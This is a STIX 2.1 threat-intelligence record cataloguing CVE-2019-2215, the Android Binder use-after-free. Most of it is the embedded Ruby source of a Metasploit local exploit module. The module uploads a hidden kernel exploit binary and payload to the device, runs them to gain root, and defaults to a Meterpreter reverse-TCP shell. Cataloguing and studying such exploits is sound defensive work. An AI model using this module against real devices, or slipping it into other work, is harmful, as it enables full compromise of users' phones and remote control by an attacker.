{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--75945421-6f28-47fa-bd7f-b555598188bb",
    "created": "2024-08-14T16:35:06.444704Z",
    "modified": "2024-08-14T16:35:06.444709Z",
    "name": "\"Android Binder Use-After-Free Exploit\"",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/local/binder_uaf.rb",
            "external_id": "binder_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-2215"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1942"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html"
        },
        {
            "source_name": "reference",
            "url": "https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/grant-h/qu1ckr00t/blob/master/native/poc.c"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Common\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => \"Android Binder Use-After-Free Exploit\",\n          'Description' => %q{\n            This module exploits CVE-2019-2215, which is a use-after-free in Binder in the\n            Android kernel. The bug is a local privilege escalation vulnerability that\n            allows for a full compromise of a vulnerable device. If chained with a browser\n            renderer exploit, this bug could fully compromise a device through a malicious\n            website.\n            The freed memory is replaced with an iovec structure in order to leak a pointer\n            to the task_struct. Finally the bug is triggered again in order to overwrite\n            the addr_limit, making all memory (including kernel memory) accessible as part\n            of the user-space memory range in our process and allowing arbitrary reading\n            and writing of kernel memory.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Jann Horn', # discovery and exploit\n            'Maddie Stone', # discovery and exploit\n            'grant-h',      # Qu1ckR00t\n            'timwr',        # metasploit module\n          ],\n          'References' => [\n            [ 'CVE', '2019-2215' ],\n            [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1942' ],\n            [ 'URL', 'https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html' ],\n            [ 'URL', 'https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/' ],\n            [ 'URL', 'https://github.com/grant-h/qu1ckr00t/blob/master/native/poc.c' ],\n          ],\n          'DisclosureDate' => '2019-09-26',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Platform' => [ \"android\", \"linux\" ],\n          'Arch' => [ ARCH_AARCH64 ],\n          'Targets' => [[ 'Auto', {} ]],\n          'DefaultOptions' => {\n            'PAYLOAD' => 'linux/aarch64/meterpreter/reverse_tcp',\n            'WfsDelay' => 5,\n          },\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_fs_getwd\n              ]\n            }\n          },\n        }\n      )\n    )\n  end\n\n  def upload_and_chmodx(path, data)\n    write_file path, data\n    chmod(path)\n    register_file_for_cleanup(path)\n  end\n\n  def exploit\n    local_file = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2019-2215\", \"exploit\")\n    exploit_data = File.read(local_file, mode: 'rb')\n\n    workingdir = session.fs.dir.getwd\n    exploit_file = \"#{workingdir}/.#{Rex::Text::rand_text_alpha_lower(5)}\"\n    upload_and_chmodx(exploit_file, exploit_data)\n    payload_file = \"#{workingdir}/.#{Rex::Text::rand_text_alpha_lower(5)}\"\n    upload_and_chmodx(payload_file, generate_payload_exe)\n\n    print_status(\"Executing exploit '#{exploit_file}'\")\n    result = cmd_exec(\"echo '#{payload_file} &' | #{exploit_file}\")\n    print_status(\"Exploit result:\\n#{result}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-09-26",
    "x_mitre_platforms": [
        "[ \"android\", \"linux\" ]"
    ]
}